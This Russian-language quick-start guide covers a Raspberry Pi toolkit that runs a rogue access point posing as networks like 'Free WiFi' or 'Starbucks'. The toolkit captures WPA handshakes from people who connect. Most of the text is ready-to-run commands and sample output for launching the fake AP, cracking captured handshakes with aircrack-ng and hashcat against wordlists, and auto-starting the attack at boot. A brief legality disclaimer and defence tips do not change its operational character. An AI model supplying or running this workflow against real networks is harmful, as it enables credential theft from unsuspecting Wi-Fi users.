# 🎯 БЫСТРЫЙ СТАРТ - БЕЗ Monitor Mode!

## ✅ Работает на встроенном WiFi Raspberry Pi

Если у вас **нет специального USB WiFi адаптера** - используйте эту версию!

---

## 📋 Что вам нужно:

1. **Raspberry Pi** (любая модель с WiFi: 3, 4, 5, Zero W)
2. **Raspberry Pi OS** (или любой Linux)
3. **Встроенный WiFi** (wlan0) - никакого дополнительного оборудования!

---

## 🚀 Быстрая установка и запуск

### Шаг 1: Скачайте файлы на Raspberry Pi

```bash
# Создайте директорию
mkdir ~/wifi_tools
cd ~/wifi_tools

# Скопируйте файлы (через scp, usb или скачайте)
```

### Шаг 2: Установите зависимости

```bash
# Обновите систему
sudo apt update

# Установите необходимые пакеты
sudo apt install -y hostapd tcpdump

# Готово! Всего 2 пакета, никаких сложностей
```

### Шаг 3: Запустите fake AP с захватом handshake

```bash
# Базовый запуск (SSID и пароль по умолчанию)
sudo python3 fake_ap_with_capture.py wlan0 "Free WiFi"

# С кастомным паролем
sudo python3 fake_ap_with_capture.py wlan0 "Starbucks" "mypassword" 6

# С выбором канала
sudo python3 fake_ap_with_capture.py wlan0 "Guest Network" "test1234" 11
```

### Шаг 4: Ожидайте подключения

Программа покажет:
```
╔════════════════════════════════════════════════╗
║   Fake AP + Handshake Capture (NO Monitor!)    ║
║     Работает на ЛЮБОМ WiFi адаптере с AP       ║
║         Включая встроенный WiFi RPi!           ║
╚════════════════════════════════════════════════╝

[2026-11-20 13:42:50] Подготовка интерфейса wlan0
[2026-11-20 13:42:51] Интерфейс готов: 192.168.100.1
[2026-11-20 13:42:52] Конфигурация создана
[2026-11-20 13:42:53] Запуск захвата EAPOL пакетов -> captures/handshake_Free_WiFi_20261120_134253.pcap
[2026-11-20 13:42:55] ✓ Захват пакетов запущен

======================================================================
[2026-11-20 13:42:58] ✓ Точка доступа запущена
======================================================================

[2026-11-20 13:42:58]   SSID: Free WiFi
[2026-11-20 13:42:58]   Канал: 6
[2026-11-20 13:42:58]   Пароль: 12345678
[2026-11-20 13:42:58]   IP: 192.168.100.1
[2026-11-20 13:42:58] 
Ожидание подключений...
```

### Шаг 5: Когда кто-то попытается подключиться

```
======================================================================
[2026-11-20 13:45:23] [+] НОВЫЙ КЛИЕНТ: aa:bb:cc:dd:ee:ff
======================================================================

[2026-11-20 13:45:24] [*] Аутентификация: aa:bb:cc:dd:ee:ff

======================================================================
[2026-11-20 13:45:25] [***] WPA HANDSHAKE: aa:bb:cc:dd:ee:ff
======================================================================

[2026-11-20 13:45:27] ✓✓✓ ПОЛНЫЙ HANDSHAKE ЗАХВАЧЕН! (4 EAPOL пакетов)
[2026-11-20 13:45:27] Файл: captures/handshake_Free_WiFi_20261120_134253.pcap
[2026-11-20 13:45:27] Для взлома: aircrack-ng captures/handshake_Free_WiFi_20261120_134253.pcap
```

### Шаг 6: Остановите (Ctrl+C)

```bash
# Нажмите Ctrl+C для остановки

[2026-11-20 13:50:10] Остановка...

======================================================================
[2026-11-20 13:50:11] ЗАХВАЧЕНО HANDSHAKES: 1
[2026-11-20 13:50:11] PCAP файл: captures/handshake_Free_WiFi_20261120_134253.pcap
[2026-11-20 13:50:11] Лог: captures/log_Free_WiFi_20261120_134253.txt
[2026-11-20 13:50:11] Клиенты: captures/clients_Free_WiFi_20261120_134253.txt

[2026-11-20 13:50:11] Для взлома используйте:
[2026-11-20 13:50:11]   aircrack-ng -w wordlist.txt captures/handshake_Free_WiFi_20261120_134253.pcap
[2026-11-20 13:50:11] или
[2026-11-20 13:50:11]   hashcat -m 22000 captures/handshake_Free_WiFi_20261120_134253.pcap wordlist.txt
======================================================================
```

---

## 💡 Взлом захваченного handshake

### С помощью aircrack-ng

```bash
# Установка aircrack-ng
sudo apt install aircrack-ng

# Взлом со словарем
aircrack-ng -w /usr/share/wordlists/rockyou.txt captures/handshake_*.pcap

# Или с собственным словарем
aircrack-ng -w my_passwords.txt captures/handshake_*.pcap
```

### С помощью hashcat (быстрее, использует GPU)

```bash
# Установка hashcat
sudo apt install hashcat

# Взлом
hashcat -m 22000 captures/handshake_*.pcap /usr/share/wordlists/rockyou.txt

# С GPU ускорением
hashcat -m 22000 -w 3 captures/handshake_*.pcap wordlist.txt
```

---

## 🎯 Какой скрипт выбрать?

| Скрипт | Monitor Mode? | Спец. адаптер? | Захват Handshake? | Сложность |
|--------|---------------|----------------|-------------------|-----------|
| **fake_ap_with_capture.py** | ❌ НЕТ | ❌ НЕТ | ✅ ДА | ⭐ Легко |
| **simple_ap_no_monitor.py** | ❌ НЕТ | ❌ НЕТ | ⚠️ Только лог | ⭐ Очень легко |
| **fake_ap.py** | ✅ ДА | ✅ ДА | ✅ ДА | ⭐⭐⭐ Сложно |
| **fake_ap_simple.py** | ✅ ДА | ✅ ДА | ✅ ДА | ⭐⭐ Средне |

---

## 🔧 Устранение проблем

### Ошибка: "Interface not found"

```bash
# Проверьте имя интерфейса
ip link show

# Обычно это wlan0, но может быть wlp2s0 или другое
# Используйте правильное имя в команде
```

### Ошибка: "hostapd not found"

```bash
# Установите hostapd
sudo apt install hostapd

# Проверьте установку
hostapd -v
```

### Ошибка: "Operation not permitted"

```bash
# Запускайте с sudo
sudo python3 fake_ap_with_capture.py wlan0 "Free WiFi"
```

### Точка доступа не создается

```bash
# Остановите конфликтующие сервисы
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
sudo killall wpa_supplicant

# Попробуйте снова
sudo python3 fake_ap_with_capture.py wlan0 "Free WiFi"
```

---

## ⚠️ ВАЖНО

### Легальность

- ✅ Тестирование своей сети
- ✅ Пентест с письменным разрешением
- ✅ Образование в контролируемой среде
- ❌ Атака на чужие сети - НЕЗАКОННО!

### Этика

- Используйте только с разрешения владельца сети
- Не захватывайте чужие данные
- Не используйте для вредоносных целей

---

## 📚 Дополнительно

### Автоматический запуск при загрузке

```bash
# Создайте systemd сервис (опционально)
sudo nano /etc/systemd/system/fake-ap.service

# Вставьте:
[Unit]
Description=Fake WiFi AP
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /home/pi/wifi_tools/fake_ap_with_capture.py wlan0 "Free WiFi"
Restart=on-failure

[Install]
WantedBy=multi-user.target

# Сохраните и активируйте
sudo systemctl enable fake-ap.service
sudo systemctl start fake-ap.service
```

### Проверка захваченного handshake

```bash
# Проверка содержимого pcap
tcpdump -r captures/handshake_*.pcap -v

# Или с tshark
tshark -r captures/handshake_*.pcap -Y eapol
```

---

## 🎓 Обучение

Эти инструменты созданы для обучения и тестирования безопасности WiFi сетей.

**Что вы узнаете:**
- Как работает WPA/WPA2 handshake
- Уязвимости WiFi сетей
- Методы защиты
- Принципы работы точек доступа

**Защита:**
- Используйте длинные пароли (15+ символов)
- Избегайте словарных паролей
- Используйте WPA3 где возможно
- Не подключайтесь к незнакомым сетям

---

## 📞 Поддержка

Файлы в проекте:
- `fake_ap_with_capture.py` - **РЕКОМЕНДУЕТСЯ** для Raspberry Pi
- `simple_ap_no_monitor.py` - простая версия без захвата
- `fake_ap.py` - требует monitor mode
- `fake_ap_simple.py` - требует monitor mode
- `check_adapter.sh` - проверка WiFi адаптера
- `install.sh` - автоустановка

Документация:
- `README.md` - полное описание
- `HOW_TO_IDENTIFY_V1.md` - про специальные адаптеры
- **QUICK_START.md** - этот файл

---

**Создано: 2026-11-20**
